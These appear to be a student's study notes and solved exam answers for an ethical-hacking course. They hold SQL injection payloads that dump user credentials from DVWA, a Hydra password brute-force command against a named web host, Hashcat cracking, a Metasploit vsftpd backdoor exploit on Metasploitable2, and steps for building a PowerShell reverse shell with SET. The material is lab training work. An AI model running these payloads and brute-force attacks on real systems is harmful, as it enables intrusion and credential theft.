**sqli** for all tables

' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() #

for all column names

' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database() #

**HYDRA** for online file

hydra -V -l istheory -P /usr/share/wordlists/rockyou.txt http-get://is.theorizeit.org/auth/ 


**corrosion** VM walkthrough

https://medium.com/@z6157881/corrosion-2-vulnhub-walkthrough-30c00787fa5d

**SOLVED PYQ**

Instruction: Before beginning, make sure that you can successfully ping the Metasploitable2 VM (control + c to stop pinging). Create a word document with appropriate screen shots.
Command: netdiscover
IP address: 192.168.0.168


Command: ping 192.168.0.168

 
1.	Visit anthonyvance.com/files/YG4pZaaE.txt. e6f6804773a2511d3b78e3707d9af6d379440c9ecba938c07783c9759593c2d52a3cc300d2a 8dad8265f3a30ddfb193b
Crack the SHA3-384 hash using Hashcat. Use a hybrid attack to crack the hash with the following pattern:

digit + digit + digit + digit + dictionary_word
?d is a placeholder for any digit (0-9)
 ?d?d?d?d (this is the mask)

That is, a dictionary word with four numbers prepended to the beginning. What is the password?
Provide detailed explanation of the command used to crack the password. [20]

Solution:	
Save the hash into a file: echo "e6f6804773a2511d3b78e3707d9af6d379440c9ecba938c07783c9759593c2d52a3cc300d2 a8dad8265f3a30ddfb193b" > hash.txt

Command: hashcat -m 17500 -a 7 hash.txt ?d?d?d?d rockyou.txt

Password: 8205lobster
 
Explanation:	
Identify the hash type
Command: hashcat --help | grep SHA3-384

Hashcat’s mode for SHA3-384: -m 17500
Determine the attack mode
Command: hashcat --help

-a 7: Hybrid Mask + Wordlist
This mode will try passwords where the mask (?d?d?d?d) is placed before each word from the dictionary file.
Example: 1234admin


**Miscellaneous

Mask placeholders (Hashcat):
Mask	Characters	Description
?l	abcdefghijklmnopqrstuvwxyz	Lowercase letters
?u	ABCDEFGHIJKLMNOPQRSTUVWXYZ	Uppercase letters
?d	0123456789	Digits
?s	!"#$%&'()*+,-./:;<=>?@[\]^_{	}~`
?a	?l?u?d?s	All printable ASCII characters
?b	All 8-bit characters (0x00–0xff)	Binary (rarely used for passwords)





Attack Modes in Hashcat:
Mode	Syntax	Description
0	-a 0	Dictionary attack
1	-a 1	Combinator attack
3	-a 3	Mask attack (brute-force style)
6	-a 6	Hybrid attack (Dict + Mask)
7	-a 7	Hybrid attack (Mask + Dict)

List wordlists available on the system

Copy rockyou.txt to your current directory

Display the cracked password

 
2.	Using NMAP, scan Metasploitable2 for web applications.
What page(s) can you find that are associated with control panels and what port(s) and service(s) are they associated with?
Provide detailed explanation of the command used to complete the given task. [20]
Solution:	 Command: sudo nmap -sV 192.168.0.168
-sV: Enables service version detection

Web-related services:
80/tcp open http	Apache httpd 2.2.8 ((Ubuntu) DAV/2) 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8180/tcp open http		Apache Tomcat/Coyote JSP engine 1.1
   Port 80/tcp: Service detected as Apache httpd 2.2.8. This is the default HTTP port.
Upon manually visiting http://192.168.0.168/ in Firefox, the default Metasploitable2 web interface is observed, which includes links to multiple vulnerable applications such as DVWA, Mutillidae, and PHPMyAdmin. This confirms port 80 hosts several web apps and control panels.
  Port 8180/tcp: Detected as Apache Tomcat/Coyote JSP engine 1.1. Accessing http://192.168.0.168:8180/ in Firefox displayed the Tomcat home page, indicating that this port is used for managing Java-based web applications. This typically includes access to the Tomcat Manager (a control panel) if login credentials are provided.
 
  Port 8009/tcp: Detected as ajp13, used by Apache Tomcat for internal backend communication. This port is not intended for direct access via browser. Visiting http://192.168.0.168:8009/ resulted in a "Connection Reset" error, as expected.
Based on this evidence, ports 80 and 8180 are directly associated with web applications and control panels. Port 8009 supports backend operations related to Tomcat but does not host a web-accessible interface.
**Miscellaneous
What to Look for in Nmap to Identify Web Services or Control Panels?

Port	Typical Use
80	HTTP (default web)
443	HTTPS (encrypted web)
8080	Alternative HTTP
8180	Tomcat, Java apps
8443	Alternative HTTPS (often Tomcat)
8000-9000	Often used for dev web apps
5000, 5601, 15672	Flask, Kibana, RabbitMQ
22 (if it says "Web SSH")	Might be a browser-based shell

Services:

Service	Means...	Web Accessible?
http or https	Web server	Yes
Apache httpd, nginx, Microsoft IIS	Web server software	Yes
Apache Tomcat, Jetty, JBoss	Java web app server	Often
Node.js, Express, Flask, Django	Frameworks for web apps	Yes
phpMyAdmin, Webmin, OpenVAS, Zabbix, etc.	Known control panels	Yes

Visual Clues in Service Names
From Nmap -sV, look out for:
   "Coyote", "Tomcat" → Apache Tomcat, usually at 8180 or 8080
   "phpMyAdmin" → DB control panel (often on port 80)
   "Jenkins" → CI/CD Dashboard (often on 8080)
   "Webmin", "Cockpit" → Linux system control panels
 
3.	Use an exploit to give you access necessary to obtain the contents of /etc/passwd on the Metasploitable2 VM. Use any exploit you wish.
Create a screenshot showing:

i.	The contents of the passwd file
ii.	The commands you ran
iii.	The output of the following commands:

echo "[your name]" date

Explain each of the commands used to complete the task. [20]

Solution:	 Exploit used: VSFTPD v2.3.4 backdoor on port 21 (identified by nmap)







Module: exploit/unix/ftp/vsftpd_234_backdoor
Target Service: vsftpd 2.3.4 running on port 21
Vulnerability: This version of vsftpd was distributed with a deliberately inserted backdoor. If a user connects with a :) in the username, it spawns a shell on port 6200.
Command > msfconsole
>	search vsftpd (searches for any exploits related to the vsftpd service)

Command > use exploit/unix/ftp/vsftpd_234_backdoor (selects the module)
>	set RHOSTS 192.168.0.168 (sets the IP address of the vulnerable machine)
>	set PAYLOAD cmd/unix/interact (This sets a simple Unix shell payload that allows interaction after exploitation. This is necessary because the exploit does not auto-configure the payload in some cases.)
>	run
 

 

Command shell:
whoami → Outputs root, confirming that the shell has root-level access

cat /etc/passwd

 
echo "name" date


4.	Create a PowerShell reverse shell social-engineering attack using Social Engineering Toolkit. Set the IP address of the reverse host to that of your Kali VM. Open the output file. What are the first 18 characters of the file?
Explain each of the commands used to complete the task. [20]

Solution:	
Launch setoolkit
>	Select “Social-Engineering Attacks”

>	Select “Powershell Attack Vectors”

>	Select “Powershell Reverse Shell”

 
>	Enter the IP Address for the reverse host: 192.168.0.105 (IP address of Kali VM)
>	Enter the port for listener [443]: 443 (Unused port)
 
SET generated the reverse shell PowerShell script and saved it in:
/root/.set/reports/powershell/powershell.reverse.txt
Access the Generated Payload File:
sudo cat /root/.set/reports/powershell/powershell.reverse.txt

Extract the First 18 Characters:
sudo head -c 18 /root/.set/reports/powershell/powershell.reverse.txt

The first 18 characters of the file are: function cleanup {
 
5.	In Kali, browse to: http://[Metasploit 2 VM IP]/dvwa and log in with: Username: admin Password: password.

Important: On the menu on the left, select "DVWA Security" and change the security level to "low".
From the "Select SQL Injection" page of DVWA, create a SQL injection that can show the username, password, first name, and last name of users in the "users" table. What SQL injection query did you create?
Explain the query in details. Note: You cannot use SQLMAP. [20]

Solution:	

 
Payload: ' and 1=0 union select concat('Table: ', table_name), concat('Column: ', column_name) from information_schema.columns where table_name = 'users' #

>	‘ : Ends the original string, allowing us to inject raw SQL logic after it.
>	and 1=0 : A dummy condition that always evaluates to false so that no rows from the original query are returned, and only rows from the UNION SELECT get displayed.
>	union select : It combines its result with the original query's expected output.
>	concat('Table: ', table_name) : It combines the label 'Table: ' with the name of each table found in the information_schema.columns table.
>	concat('Column: ', column_name) : it combines the label 'Column: ' with the name of each column in the specified table.
>	from information_schema.columns : This is a system table in MySQL that stores metadata about every column in the entire database. This queries it to list all columns in the 'users' table.
>	where table_name = 'users' : Filters the query to show only columns from the users table
>	# : Avoids syntax errors by cancelling out the rest of the original query.

Final Query (How it executes):
SELECT first_name, last_name FROM users WHERE id = '' AND 1=0
UNION SELECT concat('Table: ', table_name), concat('Column: ', column_name) FROM information_schema.columns
WHERE table_name = 'users' -- rest ignored

Columns derived: user_id, first_name, last_name, user, password, avatar
 
Payload: ' and 1=0 union select first_name, concat('Last: ', last_name, ' | User: ', user, ' | Pass: ', password) from users #

>	‘ : Ends the original string, allowing us to inject raw SQL logic after it.
>	and 1=0 : A dummy condition that always evaluates to false so that no rows from the original query are returned, and only rows from the UNION SELECT get displayed.
>	union select : It combines its result with the original query's expected output.
>	first_name : This is the first column selected in the injected query. It displays the first_name value from each user in the users table.
>	concat('Last: ', last_name, ' | User: ', user, ' | Pass: ', password) : Combines several fields into a readable single string format:
   'Last: ' → label to identify last name
  last_name → value from the users table   ' | User: ' → label to identify username   user → username from the users table
   ' | Pass: ' → label to identify password
   password → password hash of the user
This part outputs data in a human-readable format like:
Last: Brown | User: gordonb | Pass: e99a18c428cb38d5f260853678922e03
>	from users : Specifies the table we are extracting the data from, which is the users table.
>	# : Avoids syntax errors by canceling out the rest of the original query.

Final Query (How it executes):
SELECT first_name, last_name FROM users WHERE id = '' AND 1=0
UNION SELECT first_name, concat('Last: ', last_name, ' | User: ', user, ' | Pass: ', password)
FROM users -- rest ignored
